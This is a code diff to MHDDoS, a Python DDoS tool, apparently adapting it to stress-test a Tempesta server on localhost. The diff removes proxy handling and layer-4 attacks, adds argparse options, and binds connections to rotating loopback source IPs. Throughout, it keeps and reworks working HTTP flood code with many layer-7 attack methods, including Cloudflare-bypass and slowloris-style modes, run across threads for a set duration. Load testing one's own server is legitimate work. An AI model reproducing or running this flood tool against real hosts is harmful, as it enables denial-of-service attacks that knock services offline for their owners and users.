@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-
+import argparse
+import random
 from base64 import b64encode
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
@@ -38,6 +39,7 @@ from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
 
+import yarl
 from certifi import where
 from cloudscraper import create_scraper
 from dns import resolver
@@ -47,7 +49,6 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from requests import Response, Session, cookies, exceptions, get
-from yarl import URL
 
 basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")
 logger = getLogger("MHDDoS")
@@ -738,7 +739,7 @@ class HttpFlood(Thread):
     _req_type: str
     _useragents: List[str]
     _referers: List[str]
-    _target: URL
+    _target: yarl.URL
     _method: str
     _rpc: int
     _synevent: Any
@@ -747,14 +748,14 @@ class HttpFlood(Thread):
     def __init__(
         self,
         thread_id: int,
-        target: URL,
+        target: yarl.URL,
         host: str,
         method: str = "GET",
         rpc: int = 1,
         synevent: Event = None,
         useragents: Set[str] = None,
         referers: Set[str] = None,
-        proxies: Set[Proxy] = None,
+        ip_list: list[str] = None,
     ) -> None:
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
@@ -765,9 +766,7 @@ class HttpFlood(Thread):
         self._target = target
         self._host = host
         self._raw_target = (self._host, (self._target.port or 80))
-
-        if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (self._host, (self._target.port or 80))
+        self._ip_list = ip_list
 
         self.methods = {
             "POST": self.POST,
@@ -791,7 +790,7 @@ class HttpFlood(Thread):
             "TOR": self.TOR,
             "EVEN": self.EVEN,
             "DOWNLOADER": self.DOWNLOADER,
-            "BOMB": self.BOMB,
+            # "BOMB": self.BOMB,
             "PPS": self.PPS,
             "KILLER": self.KILLER,
         }
@@ -805,8 +804,6 @@ class HttpFlood(Thread):
                 ",https://www.google.com/translate?u=",
             ]
         self._referers = list(referers)
-        if proxies:
-            self._proxies = list(proxies)
 
         if not useragents:
             useragents: List[str] = [
@@ -851,7 +848,7 @@ class HttpFlood(Thread):
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (
             self._req_type,
             target.raw_path_qs,
-            randchoice(["1.0", "1.1", "1.2"]),
+            randchoice(["1.1"]),  # use only 1.0/1.1 version because Tempesta blocks others
         )
         self._payload = (
             self._defaultpayload + "Accept-Encoding: gzip, deflate, br\r\n"
@@ -911,6 +908,9 @@ class HttpFlood(Thread):
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         sock.settimeout(0.9)
+
+        if self._ip_list:
+            sock.bind((random.choice(self._ip_list), 0))
         sock.connect(host or self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -933,31 +933,29 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return (
-            "GET"
-            if {method.upper()}
-            & {
-                "CFB",
-                "CFBUAM",
-                "GET",
-                "TOR",
-                "COOKIE",
-                "OVH",
-                "EVEN",
-                "DYN",
-                "SLOW",
-                "PPS",
-                "APACHE",
-                "BOT",
-                "RHEX",
-                "STOMP",
-            }
-            else (
-                "POST"
-                if {method.upper()} & {"POST", "XMLRPC", "STRESS"}
-                else "HEAD" if {method.upper()} & {"GSB", "HEAD"} else "REQUESTS"
-            )
-        )
+        if {method.upper()} & {
+            "CFB",
+            "CFBUAM",
+            "GET",
+            "TOR",
+            "COOKIE",
+            "OVH",
+            "EVEN",
+            "DYN",
+            "SLOW",
+            "PPS",
+            "APACHE",
+            "BOT",
+            "RHEX",
+            "STOMP",
+        }:
+            return "GET"
+        elif {method.upper()} & {"POST", "XMLRPC", "STRESS"}:
+            return "POST"
+        elif {method.upper()} & {"GSB", "HEAD"}:
+            return "HEAD"
+        else:
+            return "REQUESTS"
 
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
@@ -1337,33 +1335,33 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def BOMB(self):
-        assert self._proxies, (
-            "This method requires proxies. "
-            "Without proxies you can use github.com/codesenberg/bombardier"
-        )
-
-        while True:
-            proxy = randchoice(self._proxies)
-            if proxy.type != ProxyType.SOCKS4:
-                break
-
-        res = run(
-            [
-                f"{bombardier_path}",
-                f"--connections={self._rpc}",
-                "--http2",
-                "--method=GET",
-                "--latencies",
-                "--timeout=30s",
-                f"--requests={self._rpc}",
-                f"--proxy={proxy}",
-                f"{self._target.human_repr()}",
-            ],
-            stdout=PIPE,
-        )
-        if self._thread_id == 0:
-            print(proxy, res.stdout.decode(), sep="\n")
+    # def BOMB(self):
+    #     assert self._proxies, (
+    #         "This method requires proxies. "
+    #         "Without proxies you can use github.com/codesenberg/bombardier"
+    #     )
+    #
+    #     while True:
+    #         proxy = randchoice(self._proxies)
+    #         if proxy.type != ProxyType.SOCKS4:
+    #             break
+    #
+    #     res = run(
+    #         [
+    #             f"{bombardier_path}",
+    #             f"--connections={self._rpc}",
+    #             "--http2",
+    #             "--method=GET",
+    #             "--latencies",
+    #             "--timeout=30s",
+    #             f"--requests={self._rpc}",
+    #             f"--proxy={proxy}",
+    #             f"{self._target.human_repr()}",
+    #         ],
+    #         stdout=PIPE,
+    #     )
+    #     if self._thread_id == 0:
+    #         print(proxy, res.stdout.decode(), sep="\n")
 
     def SLOW(self):
         payload: bytes = self.generate_payload()
@@ -1690,238 +1688,117 @@ class ToolsConsole:
         return {"success": False}
 
 
-def handleProxyList(con, proxy_li, proxy_ty, url=None):
-    if proxy_ty not in {4, 5, 1, 0, 6}:
-        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
-    if proxy_ty == 6:
-        proxy_ty = randchoice([4, 5, 1])
-    if not proxy_li.exists():
-        logger.warning(
-            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}"
-        )
-        proxy_li.parent.mkdir(parents=True, exist_ok=True)
-        with proxy_li.open("w") as wr:
-            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-            logger.info(
-                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
-            )
-            Proxies = ProxyChecker.checkAll(
-                Proxies,
-                timeout=5,
-                threads=threads,
-                url=url.human_repr() if url else "http://httpbin.org/get",
-            )
-
-            if not Proxies:
-                exit(
-                    "Proxy Check failed, Your network may be the problem"
-                    " | The target may not be available."
-                )
-            stringBuilder = ""
-            for proxy in Proxies:
-                stringBuilder += proxy.__str__() + "\n"
-            wr.write(stringBuilder)
-
-    proxies = ProxyUtiles.readFromFile(proxy_li)
-    if proxies:
-        logger.info(
-            f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}"
-        )
-    else:
-        logger.info(
-            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}"
-        )
-        proxies = None
-
-    return proxies
-
-
 if __name__ == "__main__":
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
-            one = argv[1].upper()
+            parser = argparse.ArgumentParser(description="ddos tools")
+            parser.add_argument("--url", type=str, default="http://localhost")
+            parser.add_argument("--threads", type=int, default=1, help="threads per each method")
+            parser.add_argument("--conns", type=int, default=1, help="ips per each method")
+            parser.add_argument("--rpc", type=int, default=1)
+            parser.add_argument("--duration", type=int, default=1)
+            parser.add_argument("--interface", type=str, default="interface")
+            arguments = parser.parse_args()
 
-            if one == "HELP":
-                raise IndexError()
-            if one == "TOOLS":
-                ToolsConsole.runConsole()
-            if one == "STOP":
-                ToolsConsole.stop()
+            URL = yarl.URL(arguments.url)
+            HOST = gethostbyname(URL.host)
+            HOST_FOR_TOR_METHOD = URL.host
+            THREADS = arguments.threads
+            CONNS = arguments.conns
+            RPC = arguments.rpc
+            DURATION = arguments.duration
+            INTERFACE = arguments.interface
+            try:
+                UAGENTS = set(
+                    a.strip() for a in Path(__dir__ / "files/useragent.txt").open("r+").readlines()
+                )
+                REFERERS = set(
+                    a.strip() for a in Path(__dir__ / "files/referers.txt").open("r+").readlines()
+                )
+            except FileNotFoundError as e:
+                exit(f"The {e.filename} file doesn't exist ")
 
-            method = one
-            host = None
-            port = None
-            url = None
-            event = Event()
-            event.clear()
-            target = None
-            urlraw = argv[2].strip()
-            if not urlraw.startswith("http"):
-                urlraw = "http://" + urlraw
+            if not UAGENTS or not REFERERS:
+                exit("Empty Referer or Useragent file ")
 
-            if method not in Methods.ALL_METHODS:
-                exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
+            if THREADS > 256:
+                logger.warning("Thread is higher than 256")
 
-            if method in Methods.LAYER7_METHODS:
-                url = URL(urlraw)
-                host = url.host
+            if CONNS > 256:
+                logger.warning("Thread is higher than 256")
 
-                if method != "TOR":
-                    try:
-                        host = gethostbyname(url.host)
-                    except Exception as e:
-                        exit("Cannot resolve hostname ", url.host, str(e))
+            if RPC > 100:
+                logger.warning("RPC (Request Pre Connection) is higher than 100")
 
-                threads = int(argv[4])
-                rpc = int(argv[6])
-                timer = int(argv[7])
-                proxy_ty = int(argv[3].strip())
-                proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
-                useragent_li = Path(__dir__ / "files/useragent.txt")
-                referers_li = Path(__dir__ / "files/referers.txt")
-                bombardier_path = Path.home() / "go/bin/bombardier"
-                proxies: Any = set()
+            EVENT = Event()
+            EVENT.clear()
 
-                if method == "BOMB":
-                    assert (
-                        bombardier_path.exists() or bombardier_path.with_suffix(".exe").exists()
-                    ), (
-                        "Install bombardier: " "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
-                    )
+            LAYER7_METHODS = {
+                "GET",
+                "POST",
+                "OVH",
+                "RHEX",
+                "STOMP",
+                "STRESS",
+                "DYN",
+                "DOWNLOADER",
+                "SLOW",
+                "HEAD",
+                "NULL",
+                "COOKIE",
+                "PPS",
+                "EVEN",
+                "GSB",
+                "DGB",
+                "AVB",
+                "BOT",
+                "APACHE",
+                "XMLRPC",
+                "CFB",
+                "CFBUAM",
+                "BYPASS",
+                "KILLER",
+                "TOR",
+            }
 
-                if len(argv) == 9:
-                    logger.setLevel("DEBUG")
+            for i, method in enumerate(LAYER7_METHODS):  # Methods.LAYER7_METHODS:
+                ip_list = [f"127.10.{i}.{n}" for n in range(CONNS)]
 
-                if not useragent_li.exists():
-                    exit("The Useragent file doesn't exist ")
-                if not referers_li.exists():
-                    exit("The Referer file doesn't exist ")
-
-                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
-                referers = set(a.strip() for a in referers_li.open("r+").readlines())
-
-                if not uagents:
-                    exit("Empty Useragent File ")
-                if not referers:
-                    exit("Empty Referer File ")
-
-                if threads > 1000:
-                    logger.warning("Thread is higher than 1000")
-                if rpc > 100:
-                    logger.warning("RPC (Request Pre Connection) is higher than 100")
-
-                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
-                for thread_id in range(threads):
+                for thread_id in range(THREADS):
                     HttpFlood(
-                        thread_id, url, host, method, rpc, event, uagents, referers, proxies
+                        thread_id,
+                        URL,
+                        host=HOST,
+                        method=method,
+                        rpc=RPC,
+                        synevent=EVENT,
+                        useragents=UAGENTS,
+                        referers=REFERERS,
+                        ip_list=ip_list,
                     ).start()
 
-            if method in Methods.LAYER4_METHODS:
-                target = URL(urlraw)
-
-                port = target.port
-                target = target.host
-
-                try:
-                    target = gethostbyname(target)
-                except Exception as e:
-                    exit("Cannot resolve hostname ", url.host, e)
-
-                if port > 65535 or port < 1:
-                    exit("Invalid Port [Min: 1 / Max: 65535] ")
-
-                if (
-                    method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"}
-                    and not ToolsConsole.checkRawSocket()
-                ):
-                    exit("Cannot Create Raw Socket")
-
-                if method in Methods.LAYER4_AMP:
-                    logger.warning("this method need spoofable servers please check")
-                    logger.warning(
-                        "https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack"
-                    )
-
-                threads = int(argv[3])
-                timer = int(argv[4])
-                proxies = None
-                ref = None
-
-                if not port:
-                    logger.warning("Port Not Selected, Set To Default: 80")
-                    port = 80
-
-                if method in {"SYN", "ICMP"}:
-                    __ip__ = __ip__
-
-                if len(argv) >= 6:
-                    argfive = argv[5].strip()
-                    if argfive:
-                        refl_li = Path(__dir__ / "files" / argfive)
-                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-                            if not refl_li.exists():
-                                exit("The reflector file doesn't exist")
-                            if len(argv) == 7:
-                                logger.setLevel("DEBUG")
-                            ref = set(a.strip() for a in Tools.IP.findall(refl_li.open("r").read()))
-                            if not ref:
-                                exit("Empty Reflector File ")
-
-                        elif argfive.isdigit() and len(argv) >= 7:
-                            if len(argv) == 8:
-                                logger.setLevel("DEBUG")
-                            proxy_ty = int(argfive)
-                            proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
-                            proxies = handleProxyList(con, proxy_li, proxy_ty)
-                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
-                                exit("this method cannot use for layer4 proxy")
-
-                        else:
-                            logger.setLevel("DEBUG")
-
-                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-
-                if method == "MCBOT":
-                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
-                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
-                        Tools.send(s, Minecraft.data(b"\x00"))
-
-                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
-                        protocolid = (
-                            con["MINECRAFT_DEFAULT_PROTOCOL"]
-                            if not protocolid
-                            else int(protocolid.group(1))
-                        )
-
-                        if 47 < protocolid > 758:
-                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-
-                for _ in range(threads):
-                    Layer4((target, port), ref, method, event, proxies, protocolid).start()
-
             logger.info(
-                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
-                % (target or url.host, method, timer, threads)
+                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} "
+                f"{HOST}{bcolors.WARNING} with{bcolors.OKBLUE} {method}{bcolors.WARNING} "
+                f"method for{bcolors.OKBLUE} {DURATION}{bcolors.WARNING} seconds, "
+                f"threads:{bcolors.OKBLUE} {CONNS}{bcolors.WARNING}!{bcolors.RESET}"
             )
-            event.set()
+            EVENT.set()
             ts = time()
-            while time() < ts + timer:
+            while time() < ts + DURATION:
                 logger.debug(
-                    f"{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}"
-                    % (
-                        target or url.host,
-                        port or (url.port or 80),
-                        method,
-                        Tools.humanformat(int(REQUESTS_SENT)),
-                        Tools.humanbytes(int(BYTES_SEND)),
-                        round((time() - ts) / timer * 100, 2),
-                    )
+                    f"{bcolors.WARNING}Target:{bcolors.OKBLUE} {HOST},{bcolors.WARNING} "
+                    f"Port:{bcolors.OKBLUE} {URL.port},{bcolors.WARNING} "
+                    f"Method:{bcolors.OKBLUE} {method}{bcolors.WARNING} "
+                    f"PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))},{bcolors.WARNING}"
+                    f" BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))} / "
+                    f"{round((time() - ts) / DURATION * 100, 2)}{bcolors.RESET}"
                 )
                 REQUESTS_SENT.set(0)
                 BYTES_SEND.set(0)
                 sleep(1)
 
-            event.clear()
+            EVENT.clear()
             exit()
 
         ToolsConsole.usage()
